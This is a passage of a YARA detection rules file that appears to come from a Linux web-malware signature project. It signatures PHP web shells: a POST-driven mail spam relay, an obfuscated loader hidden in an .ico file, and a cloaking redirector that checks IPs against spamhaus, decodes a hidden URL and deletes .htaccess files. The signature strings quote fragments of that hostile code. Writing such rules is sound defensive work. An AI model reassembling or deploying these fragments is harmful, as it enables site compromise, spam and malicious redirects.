      $s1 = "$jwgpxlzblkepa = base64_decode($_POST['tdluhqtnmzr']);  " fullword ascii
      $s2 = "$jewrqwbnlk = base64_decode($_POST['ylxqjqbcn']); " fullword ascii
      $s3 = "$fcublsqtpae = base64_decode($_POST['qqifquaqdzvp']);  " fullword ascii
      $s4 = "$xaouf = base64_decode($_POST['nrsf']); " fullword ascii
      $s5 = "$jfnbrsjfq = mail($jewrqwbnlk, $xaouf, $jwgpxlzblkepa, $fcublsqtpae);" fullword ascii
      $s6 = "if($jfnbrsjfq){echo 'vwkxlpc';} else {echo 'yfbhn : ' . $jfnbrsjfq;} " fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 1KB and
         ( all of them )
      ) or ( all of them )
}

rule backdoor__1715ce0b {
   meta:
      description = "work1 - file backdoor_.1715ce0b.ico"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2019-12-22"
      hash1 = "14d58a0e5c09b4a0791f8ea400d62ca17456ebd55b5e999420ea6297bd670dc9"
   strings:
      $s1 = "$_whsb8 = basename/*vox*/(/*e0iq*/trim/*kh7m*/(/*7r*/preg_replace/*iac9*/(/*8b*/rawurldecode/*zad7*/(/*t7n2x*/\"%2F%5C%28.%2A%24" ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 300KB and
         ( all of them )
      ) or ( all of them )
}

rule _home_hawk_infected_12_22_19_shell1_work1_34esd23 {
   meta:
      description = "work1 - file 34esd23.zip"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2019-12-22"
      hash1 = "8862eefed0ef325212a49f8617a396a7ef3b6e5d05cddeda998dbf1ae834be91"
   strings:
      $s1 = "papkaa17/g336803.txt" fullword ascii
      $s2 = "papkaa17/g757230.txt" fullword ascii
      $s3 = "papkaa17/g554038.txt" fullword ascii
      $s4 = "papkaa17/g864401.txt" fullword ascii
      $s5 = "papkaa17/g380118.txt" fullword ascii
      $s6 = "papkaa17/g200125.txt" fullword ascii
      $s7 = "papkaa17/g365278.txt" fullword ascii
      $s8 = "papkaa17/g895434.txt" fullword ascii
      $s9 = "papkaa17/g554066.txt" fullword ascii
      $s10 = "system.phpu" fullword ascii
      $s11 = "system.phpPK" fullword ascii
   condition:
      ( uint16(0) == 0x4b50 and
         filesize < 200KB and
         ( 8 of them )
      ) or ( all of them )
}

rule ailmentx {
   meta:
      description = "work1 - file ailmentx.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2019-12-22"
      hash1 = "324b93964b99f4c66253182bbbecb80b231743dbade2f3b361950248367ac065"
   strings:
      $s1 = "$ip=$_SERVER['REMOTE_ADDR'];if(array_key_exists('HTTP_X_FORWARDED_FOR',$_SERVER)){$ip=array_pop(explode(',',$_SERVER['HTTP_X_FO" fullword ascii
      $s2 = "$dr=gethostbyname(\"186.171.144.205.zen.spamhaus.org\");" fullword ascii
      $s3 = "$dr=gethostbyname($_SERVER['HTTP_HOST'].'.dbl.spamhaus.org');" fullword ascii
      $s4 = "$pri_addrs=array('10.0.0.0|10.255.255.255','172.16.0.0|172.31.255.255','192.168.0.0|192.168.255.255','169.254.0.0|169.254.255.2" fullword ascii
      $s5 = "if(a()){$u=\"https://google.com\";}else{$k=strlen($u);}" fullword ascii
      $s6 = "if(preg_match(\"/^127\\.0\\.1/\",$dr)){header(\"HTTP/1.1 404 Not Found\");exit;}" fullword ascii
      $s7 = "if(preg_match(\"/^127\\.0\\.0/\",$dr)){header(\"HTTP/1.1 404 Not Found\");exit;}" fullword ascii
      $s8 = "list($start,$end)=explode('|',$pri_addr);if($long_ip >= ip2long($start) && $long_ip <= ip2long($end)){return true;}" fullword ascii
      $s9 = "m(array(98,202,214,214,210,156,145,145,201,209,209,198,214,212,215,213,214,199,198,214,212,195,198,199,144,213,215));" fullword ascii
      $s10 = "header(\"Set-Cookie: bb4a88417b3d0170f=$k\");header(\"Location: $u\");" fullword ascii
      $s11 = "$ip=$_SERVER['REMOTE_ADDR'];if(array_key_exists('HTTP_X_FORWARDED_FOR',$_SERVER)){$ip=array_pop(explode(',',$_SERVER['HTTP_X_FOR" ascii
      $s12 = "$d=array_shift($a);$l=\"\";foreach($a as $b){$l.=chr($b-$d);} return $l;" fullword ascii
      $s13 = "55','127.0.0.0|127.255.255.255');" fullword ascii
      $s14 = "foreach($d as $p){$a=\"htac\".\"c\".\"es\".\"s\";$a1=$p.\".$a\";$a2=$p.$a;$a3=$p.\"$a.txt\";@chmod($a1,0666);@unlink($a1);@chmod" ascii
      $s15 = "foreach($d as $p){$a=\"htac\".\"c\".\"es\".\"s\";$a1=$p.\".$a\";$a2=$p.$a;$a3=$p.\"$a.txt\";@chmod($a1,0666);@unlink($a1);@chmod" ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 4KB and
         ( 8 of them )
      ) or ( all of them )
}

